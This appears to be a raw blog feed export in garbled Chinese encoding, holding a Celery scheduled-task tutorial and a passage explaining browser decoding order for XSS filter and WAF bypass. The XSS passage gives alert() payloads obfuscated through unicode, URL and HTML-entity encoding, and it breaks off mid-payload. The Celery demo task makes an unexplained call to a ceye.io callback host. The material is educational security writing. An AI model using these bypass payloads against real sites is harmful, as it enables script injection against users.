    <content><![CDATA[<h1 id="Celeryå®šæ—¶ä»»åŠ¡"><a href="#Celeryå®šæ—¶ä»»åŠ¡" class="headerlink" title="Celeryå®šæ—¶ä»»åŠ¡"></a>Celeryå®šæ—¶ä»»åŠ¡</h1><h2 id="celery-beat"><a href="#celery-beat" class="headerlink" title="celery beat"></a>celery beat</h2><p>å®šæ—¶ä»»åŠ¡ç”± Celery Beat è¿›ç¨‹å‘¨æœŸæ€§åœ°å°†ä»»åŠ¡å‘å¾€ä»»åŠ¡é˜Ÿåˆ—ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯åŠ¨ä¸€ä¸ªCelery Beatå’Œä¸€ä¸ªCelery Workerã€‚Celery Beatå¯åŠ¨æ–¹å¼å’ŒCelery Workerä¸€è‡´ï¼Œä¸‹é¢æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹Celeryå®šæ—¶ä»»åŠ¡æ€ä¹ˆcodingã€‚</p>
<h2 id="è®¾ç½®"><a href="#è®¾ç½®" class="headerlink" title="è®¾ç½®"></a>è®¾ç½®</h2><p>é¦–å…ˆæ˜¯å®šæ—¶ä»»åŠ¡çš„å„ç§è®¾ç½®</p>
<h3 id="æ—¶åŒº"><a href="#æ—¶åŒº" class="headerlink" title="æ—¶åŒº"></a>æ—¶åŒº</h3><p>é»˜è®¤æƒ…å†µä¸‹æ˜¯UTC æ—¶åŒºï¼Œå¯ä»¥é€šè¿‡timezoneä¿®æ”¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">timezone=<span class="string">&#x27;Europe/London&#x27;</span></span><br><span class="line"><span class="comment"># æˆ–è€…é…ç½®ä¸­å›½æ—¶é—´</span></span><br><span class="line">app.conf.timezone = <span class="string">&#x27;Asia/Shanghai&#x27;</span> </span><br><span class="line">app.conf.enable_utc = <span class="literal">False</span> </span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="beat-schedule"><a href="#beat-schedule" class="headerlink" title="beat_schedule"></a>beat_schedule</h3><p>å®šæ—¶ä»»åŠ¡çš„æ ¸å¿ƒé…ç½®</p>
<p>taskï¼š æŒ‡å®šä»»åŠ¡çš„åå­—<br>schedule : è®¾å®šä»»åŠ¡çš„è°ƒåº¦æ–¹å¼ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªè¡¨ç¤ºç§’çš„æ•´æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ª timedelta å¯¹è±¡ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ª crontab å¯¹è±¡ï¼ˆåé¢ä»‹ç»ï¼‰ï¼Œæ€»ä¹‹å°±æ˜¯è®¾å®šä»»åŠ¡å¦‚ä½•é‡å¤æ‰§è¡Œ<br>argsï¼š     ä»»åŠ¡çš„ä½ç½®å‚æ•°ä»¥åˆ—è¡¨çš„å½¢å¼<br>kwargsï¼šä»»åŠ¡çš„å…³é”®å­—å‚æ•°,ä»¥å­—å…¸çš„å½¢å¼<br>optionsï¼šæ‰€æœ‰ apply_async æ‰€æ”¯æŒçš„å‚æ•°</p>
<p>ä¸€ä¸ªå¸¸è§çš„ä¾‹å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">myapp.conf.beat_schedule = &#123;</span><br><span class="line">    <span class="comment"># mæ¯åˆ†é’Ÿä¸€æ¬¡demo_scheduleä»»åŠ¡</span></span><br><span class="line">    <span class="string">&#x27;sending_email_minute&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;sending_email&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;schedule&#x27;</span>: crontab(),</span><br><span class="line">        <span class="string">&#x27;args&#x27;</span>: (<span class="string">&quot;123456@qq.com&quot;</span>, <span class="string">&quot;hello&quot;</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ‰§è¡Œå‘¨æœŸçš„å¯¹è±¡"><a href="#æ‰§è¡Œå‘¨æœŸçš„å¯¹è±¡" class="headerlink" title="æ‰§è¡Œå‘¨æœŸçš„å¯¹è±¡"></a>æ‰§è¡Œå‘¨æœŸçš„å¯¹è±¡</h3><p><strong>timedelta å¯¹è±¡</strong></p>
<p>è¡¨ç¤ºé—´éš”æ—¶é—´æ‰§è¡Œï¼Œæ˜¯æ¯”è¾ƒç®€å•çš„ä¸€ç§å®šæ—¶æ–¹å¼ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"></span><br><span class="line">timedelta(seconds=<span class="number">3</span>), <span class="comment">#æ¯ä¸‰ç§’ æ‰§è¡Œä¸€æ¬¡</span></span><br></pre></td></tr></table></figure>

<p><strong>crontab å¯¹è±¡</strong></p>
<p>å‚è€ƒä¸linuxçš„crontabå®šåˆ¶æ–¹å¼ï¼Œå¯è¿›è¡Œç»†èŠ‚åŒ–å®šåˆ¶å®šæ—¶ä»»åŠ¡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#scheduleé…ç½®ä¸¾ä¾‹</span></span><br><span class="line"><span class="keyword">from</span> celery.schedules <span class="keyword">import</span> crontab</span><br><span class="line"><span class="comment"># æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</span></span><br><span class="line">crontab()</span><br><span class="line"><span class="comment"># æ¯å¤©å‡Œæ™¨åäºŒç‚¹æ‰§è¡Œ</span></span><br><span class="line">crontab(minute=<span class="number">0</span>, hour=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># æˆ–è€…è¿™ä¹ˆå†™ï¼Œæ¯å°æ—¶æ‰§è¡Œä¸€æ¬¡</span></span><br><span class="line">crontab(minute=<span class="number">0</span>, hour=<span class="string">&quot;*/1&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="åŠ è½½é…ç½®"><a href="#åŠ è½½é…ç½®" class="headerlink" title="åŠ è½½é…ç½®"></a>åŠ è½½é…ç½®</h2><p>1ã€app.conf.å‚æ•°åç§° &#x3D; å‚æ•°å€¼<br>2ã€app.config_from_object(é…ç½®æ–‡ä»¶è·¯å¾„)<br>3ã€app.conf.update(<br>    å‚æ•°åç§°&#x3D;å‚æ•°å€¼,<br>    å‚æ•°åç§°&#x3D;å‚æ•°å€¼<br>)</p>
<h2 id="Celery-beat-å’Œ-Workerå¯åŠ¨"><a href="#Celery-beat-å’Œ-Workerå¯åŠ¨" class="headerlink" title="Celery beat å’Œ Workerå¯åŠ¨"></a>Celery beat å’Œ Workerå¯åŠ¨</h2><p>1ã€celery -A celery_server.myapp beat -l debug</p>
<p>2ã€celery -A celery_server.myapp worker</p>
<h2 id="å®šæ—¶ä»»åŠ¡demo"><a href="#å®šæ—¶ä»»åŠ¡demo" class="headerlink" title="å®šæ—¶ä»»åŠ¡demo"></a>å®šæ—¶ä»»åŠ¡demo</h2><p>celery_server.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># rediså¼€å¯å å¯åŠ¨ä¸‹é¢ä¸¤ä¸ªä»»åŠ¡</span></span><br><span class="line"><span class="comment"># 1ã€celery -A celery_server.myapp beat -l debug</span></span><br><span class="line"><span class="comment"># 2ã€celery -A celery_server.myapp worker</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"><span class="keyword">from</span> celery.schedules <span class="keyword">import</span> crontab</span><br><span class="line"> </span><br><span class="line">myapp = Celery(<span class="string">&#x27;schedule&#x27;</span>)</span><br><span class="line">myapp.conf.broker_url = <span class="string">&#x27;redis://localhost:6379/0&#x27;</span></span><br><span class="line">myapp.conf.result_backend = <span class="string">&#x27;redis://localhost:6379/1&#x27;</span></span><br><span class="line">myapp.conf.imports = [<span class="string">&#x27;celery_task&#x27;</span>]</span><br><span class="line">myapp.conf.worker_concurrency = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">myapp.conf.beat_schedule = &#123;</span><br><span class="line">    <span class="comment"># æ¯åˆ†é’Ÿä¸€æ¬¡demo_scheduleä»»åŠ¡</span></span><br><span class="line">    <span class="string">&#x27;sending_email_minute&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;sending_email&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;schedule&#x27;</span>: crontab(),</span><br><span class="line">        <span class="string">&#x27;args&#x27;</span>: (<span class="string">&quot;123456@qq.com&quot;</span>, <span class="string">&quot;hello&quot;</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>celery_task.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rediså¼€å¯å å¯åŠ¨ä¸‹é¢ä¸¤ä¸ªä»»åŠ¡</span></span><br><span class="line"><span class="comment"># 1ã€celery -A celery_server.myapp beat -l debug</span></span><br><span class="line"><span class="comment"># 2ã€celery -A celery_server.myapp worker</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> celery_server <span class="keyword">import</span> myapp</span><br><span class="line"></span><br><span class="line"><span class="meta">@myapp.task(<span class="params">name=<span class="string">&#x27;sending_email&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_email</span>(<span class="params">email,content</span>):</span><br><span class="line">	requests.get(<span class="string">&quot;http://redis.xxxxx.ceye.io&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(email+<span class="string">&quot;å‘é€æˆåŠŸ&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥åˆ°ä»£ç æ‰€åœ¨ç›®å½•ï¼Œå¯åŠ¨ï¼š</p>
<p>celery -A celery_server.myapp beat -l debug</p>
<p>celery -A celery_server.myapp worker</p>
<p>å®šæ—¶ä»»åŠ¡å°±ä¼šå®šæ—¶æ‰§è¡Œã€‚</p>
<h2 id="å¤‡æ³¨"><a href="#å¤‡æ³¨" class="headerlink" title="å¤‡æ³¨"></a>å¤‡æ³¨</h2><p>åç»­å¦‚æœé‡åˆ°æ›´å¤æ‚çš„å®šæ—¶ä»»åŠ¡çš„æ—¶å€™å†æ¥ç€è¡¥å……ï¼Œç›®å‰ä»…ç”¨åˆ°äº†ä¸€äº›ç®€å•çš„å®šæ—¶ä»»åŠ¡æ¨¡å—ã€‚</p>
]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>xssä¹‹æµè§ˆå™¨çš„ç¼–ç ä¸è§£ç </title>
    <url>//posts/xss%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81/</url>
    <content><![CDATA[<h1 id="xssä¹‹æµè§ˆå™¨çš„ç¼–ç å’Œè§£ç "><a href="#xssä¹‹æµè§ˆå™¨çš„ç¼–ç å’Œè§£ç " class="headerlink" title="xssä¹‹æµè§ˆå™¨çš„ç¼–ç å’Œè§£ç "></a>xssä¹‹æµè§ˆå™¨çš„ç¼–ç å’Œè§£ç </h1><p>åœ¨åšä¸€äº›xssçš„è¿‡æ»¤å’Œç»•è¿‡æ—¶ï¼Œæ€»æ˜¯ä½¿ç”¨å„ç§ç¼–ç ç»•è¿‡ï¼Œæœ‰æ—¶å€™æ˜¯unicodeï¼Œæœ‰æ—¶å€™æ˜¯urlencodeï¼Œæœ‰æ—¶å€™æ˜¯HTMLå®ä½“åŒ–ç¼–ç ï¼Œä½†æ˜¯å¾ˆå¤šæ—¶å€™éƒ½æ˜¯ç›´æ¥fuzzï¼Œå¯¹äºå­˜åœ¨xssçš„æ¼æ´ç‚¹ï¼Œå¹¶æ²¡æœ‰æ¸…æ¥šçš„åˆ†æå’Œè®¤è¯†ï¼Œå¯¹äºæµè§ˆå™¨çš„ç¼–ç å’Œè§£ç æ²¡æœ‰ç³»ç»Ÿçš„è®¤è¯†ï¼Œè¿™ä¼šå¯¼è‡´æˆ‘ä»¬çš„payloadç†è§£ä¸åˆ°ä½ï¼Œä»è€Œé”™å¤±å¾ˆå¤šä¸ªsrcä¸­çš„xssæ¼æ´ã€‚ä¸ºäº†ä»¥åèƒ½æ›´å¥½çš„æŒ–æ˜xssæ¼æ´å’Œæ›´å¿«çš„fuzzå‡ºè¿‡wafæ‰‹æ³•ã€‚ä»Šå¤©å°±æ¥è¯¦ç»†æ¢³ç†ä¸‹æµè§ˆå™¨çš„ç¼–ç å’Œè§£ç è¿‡ç¨‹ã€‚</p>
<span id="more"></span>

<h2 id="æµè§ˆå™¨å·¥ä½œè¿‡ç¨‹"><a href="#æµè§ˆå™¨å·¥ä½œè¿‡ç¨‹" class="headerlink" title="æµè§ˆå™¨å·¥ä½œè¿‡ç¨‹"></a>æµè§ˆå™¨å·¥ä½œè¿‡ç¨‹</h2><p>æˆ‘ä»¬éƒ½çŸ¥é“ç½‘ä¸Šæœ‰å¾ˆå¤šäººå†™äº†ä¸€ä¸ªâ€urlç‚¹å‡»åç”µè„‘éƒ½åšäº†ä»€ä¹ˆâ€ï¼Œå¦‚æœæ„Ÿå…´è¶£å¯ä»¥å»çœ‹çœ‹ã€‚è¿™é‡Œä¸åœ¨èµ˜è¿°è¯·æ±‚æœåŠ¡ç«¯çš„æµç¨‹ï¼Œè¿™é‡Œä¸»è¦æ¢³ç†çš„æ˜¯ä¸€ä¸ªé¡µé¢å“åº”åæµè§ˆå™¨æ˜¯å¦‚ä½•æ¸²æŸ“ç»™æˆ‘ä»¬çœ‹çš„ã€‚</p>
<p>æµè§ˆå™¨æ˜¯å¯ä»¥è§£æhtmlã€svgã€xhtmlçš„ï¼Œæˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨çš„ç½‘é¡µä¹ŸåŸºæœ¬éƒ½æ˜¯è¿™ä¸‰ç§æ ¼å¼ï¼Œæµè§ˆå™¨é¦–å…ˆå°†å“åº”çš„HTMLç±»æ–‡æœ¬è§£æä¸ºDOMæ ‘ã€‚å½“ç„¶CSSè§£æä¹Ÿä¼šè§£æä¸ºCSSçš„TREEï¼Œä½†æ˜¯è¿™é‡Œä¸è®¨è®ºCSSã€‚æˆ‘ä»¬ä¸‹é¢éƒ½ä»¥HTMLä¸¾ä¾‹</p>
<p>æµè§ˆå™¨é€šè¿‡è§£æHTMLä¸ºDOM æ ‘å¹¶é€šè¿‡å¼€å§‹æ ‡ç­¾ã€ç»“æŸæ ‡ç­¾å’Œæ ‡ç­¾çš„å±æ€§ã€æ–¹æ³•ç­‰æ ¹æ®ç®—æ³•è¿›è¡Œè§£æçš„ã€‚æ‰€ä»¥æµè§ˆå™¨é¦–å…ˆæ˜¯è§£æHTMLï¼Œç„¶åæ ¹æ®æ ‡ç­¾æ„å»ºDOMæ ‘ï¼Œæ­¤æ—¶æµè§ˆå™¨æ˜¯æ²¡åŠæ³•è¯†åˆ«å®ä½“ç¼–ç çš„é‚£äº›å†…å®¹çš„ï¼Œæ„å»ºå®Œdomæ ‘åï¼Œæµè§ˆå™¨æ‰ä¼šå¯¹æ ‡ç­¾é‡Œçš„å†…å®¹è¿›è¡Œè§£æï¼Œç„¶åé‡åˆ°å®ä½“ç¼–ç çš„è¯ä¼šè§£ç ã€‚æ‰€ä»¥å®ä½“åŒ–ç¼–ç çš„æ ‡ç­¾æ˜¯ä¸ä¼šæ„å»ºä¸ºèŠ‚ç‚¹çš„ï¼ˆæ‰€ä»¥å®ä½“åŒ–ç¼–ç å¾ˆå¤šæ—¶å€™éƒ½æœ‰ç”¨)ã€‚</p>
<p>æµè§ˆå™¨é€šè¿‡ä¸Šè¿°çš„æ­¥éª¤æ¥è§£æå„ä¸ªæ ‡ç­¾ï¼Œæœ€ç»ˆç»“åˆjavascriptçš„å¼•æ“å’ŒCSSçš„å¼•æ“å®Œæˆå¯¹æ•´ä¸ªé¡µé¢çš„æ“ä½œå’Œæ¸²æŸ“ã€‚</p>
<h2 id="æµè§ˆå™¨çš„è§£ç é¡ºåº"><a href="#æµè§ˆå™¨çš„è§£ç é¡ºåº" class="headerlink" title="æµè§ˆå™¨çš„è§£ç é¡ºåº"></a>æµè§ˆå™¨çš„è§£ç é¡ºåº</h2><p>é¡µé¢å“åº”åæµè§ˆå™¨æ‹¿åˆ°äº†HTMLçš„é¡µé¢æ–‡æœ¬ï¼Œæµè§ˆå™¨é¦–å…ˆæ ¹æ®èŠ‚ç‚¹æ„å»ºDOMæ ‘ï¼Œæ„å»ºçš„æ—¶å€™æ˜¯ä¸ä¼šè¿›è¡Œè§£ç çš„ï¼Œæ‰€ä»¥å¦‚æœä½ è¾“å…¥ä¸€ä¸ª</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>&amp;#<span class="attr">x3d</span>;&quot;<span class="attr">http:</span>//<span class="attr">xxx.com</span>/<span class="attr">1.jpg</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>å³ä½¿<a href="http://xxx.com/1.jpg%E7%9C%9F%E7%9A%84%E6%98%AF%E4%B8%80%E5%BC%A0%E5%9B%BE%E7%89%87%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E5%88%B0%EF%BC%8C%E8%BF%99%E4%B8%AAimg%E6%A0%87%E7%AD%BE%E4%B9%9F%E6%98%AF%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%87%BA%E6%9D%A5%E7%9A%84%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%9E%84%E5%BB%BA%E7%9A%84%E6%97%B6%E5%80%99%E6%B2%A1%E6%9C%89%E8%A7%A3%E7%A0%81%EF%BC%8Csrc%E4%B8%8D%E4%BC%9A%E8%A2%AB%E8%AE%A4%E4%B8%BA%E6%98%AF%E4%B8%80%E4%B8%AA%E9%93%BE%E6%8E%A5%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%B2%A1%E6%9C%89%E4%BA%86%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E3%80%82">http://xxx.com/1.jpgçœŸçš„æ˜¯ä¸€å¼ å›¾ç‰‡ä¹Ÿå¯ä»¥è®¿é—®åˆ°ï¼Œè¿™ä¸ªimgæ ‡ç­¾ä¹Ÿæ˜¯æ˜¾ç¤ºä¸å‡ºæ¥çš„ï¼Œå› ä¸ºæ„å»ºçš„æ—¶å€™æ²¡æœ‰è§£ç ï¼Œsrcä¸ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªé“¾æ¥ï¼Œä¹Ÿå°±æ²¡æœ‰äº†è¿™ä¸ªå±æ€§ã€‚</a></p>
<p>javascriptåœ¨htmlè§£æä¸­ä¹Ÿå­˜åœ¨ä¸€å®šçš„ä½œç”¨ï¼Œä¼šå‚ä¸å…¶domæ ‘çš„æ„å»ºã€‚æ‰€ä»¥è¿™å¹¶ä¸æ˜¯çº¿æ€§é¡ºåºçš„ã€‚æ¯”å¦‚domå‹xssï¼Œä½†æ˜¯å¤§æ–¹å‘ä¸Šï¼Œè§£æè¿˜æ˜¯å…ˆhtmlçš„è§£æã€‚</p>
<p>DOMèŠ‚ç‚¹å»ºç«‹èµ·æ¥ä»¥åå°±è¦è¿›è¡Œè§£æäº†ï¼Œæ¯”å¦‚ä»–é‡åˆ°scriptæ ‡ç­¾å°±éœ€è¦JavaScriptæ¥è§£æï¼Œå½“é‡åˆ°styleå°±ç»™cssçš„è§£æå™¨ã€‚srcã€hrefè¿™ç§é“¾æ¥å½¢å¼çš„ä¼šè°ƒç”¨URLè§£ç ã€åŒæ—¶å¯¹äºä¸€äº›ä¼ªåè®®ï¼Œä¹Ÿä¼šè°ƒç”¨ç›¸åº”çš„è§£æå™¨ã€‚</p>
<p>æ¯”å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%61%6c%65%72%74&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªä¾‹å­æ˜¯å¯ä»¥å¼¹çª—çš„ï¼Œå› ä¸ºdomæ ‘æ„å»ºåï¼Œè§£æè¿‡ç¨‹ä¸­å‘ç°hrefä¸ºä¸€ä¸ªé“¾æ¥ï¼Œä¼šè¿›è¡Œurldecodeï¼Œç„¶åå› ä¸ºjavascriptä¼ªåè®®ï¼Œä¼šäº¤ç»™javascriptæ¥è§£æï¼Œæœ€ç»ˆé€ æˆä»£ç æ‰§è¡Œã€‚</p>
<p>å½“ç„¶javascriptæœ¬èº«å°±æ”¯æŒunicode,æ‰€ä»¥ä¸‹é¢è¿™æ ·ä¹Ÿæ˜¯å¯ä»¥å¼¹çª—çš„ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5c%75%30%30%36%31%6c%65%72%74(123);&quot;</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- éœ€è¦æ³¨æ„çš„æ˜¯æ‹¬å·ã€å¼•å· ä¸èƒ½è¢«unicodeæ›¿ä»£ï¼Œå¦åˆ™jsä¸ä¼šè®¤ä¸ºè¿™æ˜¯éœ€è¦è§£ç çš„æ–¹æ³•æˆ–è€…å­—æ®µï¼Œåªä¼šè¢«å½“ä½œå­—ç¬¦ä¸²ã€‚ --&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æˆ‘ä»¬ç”¨ä¸¤å¼ å›¾æ¥çœ‹ä¸‹æµè§ˆå™¨å·¥ä½œå’Œè§£ç çš„æµç¨‹ï¼š</p>
<p>å›¾ä¸€DOMæ ‘ï¼š</p>
<p>![image-20221026102503733](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20221026102503733.png)</p>
<p>å›¾äºŒæ„å»ºæµç¨‹ï¼š</p>
<p>![image-20221026102859384](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20221026102859384.png)</p>
<p>å¦‚ä¸Šé¢ä¸¤ä¸ªå›¾æ‰€ç¤ºï¼ŒHTMLè§£ææ„å»ºDOM-&gt;scriptå‚ä¸æ„å»ºDOM-&gt;DOM TREEæ„å»ºå®Œåä¼šè¿›è¡ŒHTMLè§£ç -&gt;renderingæ¸²æŸ“ï¼ˆå¦‚æœä¸­é—´é‡åˆ°URLä¼šè¿›è¡ŒURLDECODEï¼‰</p>
<p>æ—¢ç„¶äº†è§£äº†è§£æçš„æµç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¾—äº†è§£ä¸‹å¯ä»¥è‡ªè§£ç çš„ç¼–ç æœ‰å“ªäº›ï¼Ÿ</p>
<p>HTMLæœ‰ä¸¤ç§ç¼–ç æ–¹å¼ï¼šè¿›åˆ¶ç¼–ç å’Œå®ä½“ç¼–ç ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;lt;</span></span><br><span class="line">&amp;#60</span><br><span class="line">&amp;#x61</span><br></pre></td></tr></table></figure>

<p>JavaScriptè‡ªè§£ç æœ‰ä¸‰ç§ï¼šUnicodeï¼Œåè¿›åˆ¶ï¼Œåå…­è¿›åˆ¶</p>
<p>æ³¨æ„ï¼šåœ¨jsä¸­ï¼Œå•å¼•å·ï¼ŒåŒå¼•å·å’Œåœ†æ‹¬å·ç­‰å±äºæ§åˆ¶å­—ç¬¦ï¼Œç¼–ç åå°†æ— æ³•è¯†åˆ«ï¼Œæ‰€ä»¥ä¸‹é¢è¿™ç§æ— æ³•æ‰§è¡Œï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># ä¸å¯ä»¥æ‰§è¡Œ</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029</span>&gt;</span></span><br><span class="line">#å¯ä»¥æ‰§è¡Œ</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">\u0061\u006c\u0065\u0072\u0074(</span>&#x27;\<span class="attr">u0031</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<p>URLåªæœ‰ä¸€ç§ç¼–ç æ–¹å¼å°±æ˜¯URLï¼Œè¿™ä¸ªå¾ˆå¥½ç†è§£ã€‚</p>
<h2 id="åœ¨å®è·µä¸­ç†è§£"><a href="#åœ¨å®è·µä¸­ç†è§£" class="headerlink" title="åœ¨å®è·µä¸­ç†è§£"></a>åœ¨å®è·µä¸­ç†è§£</h2><p>ä¸‹é¢æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„xss payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(123)&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºjavascriptè§£æå™¨å¯ä»¥è§£æunicodeï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å˜ç§ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(123)&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å› ä¸ºhrefæ˜¯ä¸€ä¸ªé“¾æ¥æ‰€ä»¥è‚¯å®šä¼šè¢«URLè§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å˜ç§</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34%28%31%32%33%29&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç°åœ¨å› ä¸ºæ„å»ºDOMæ ‘çš„æ—¶å€™ä¼šå¯¹HTMLè¿›è¡Œè‡ªè§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å˜ç§</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x006a;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x0076;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x0073;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0072;</span><span class="symbol">&amp;#x0069;</span><span class="symbol">&amp;#x0070;</span><span class="symbol">&amp;#x0074;</span><span class="symbol">&amp;#x003a;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0036;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0036;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0036;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0036;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0035;</span><span 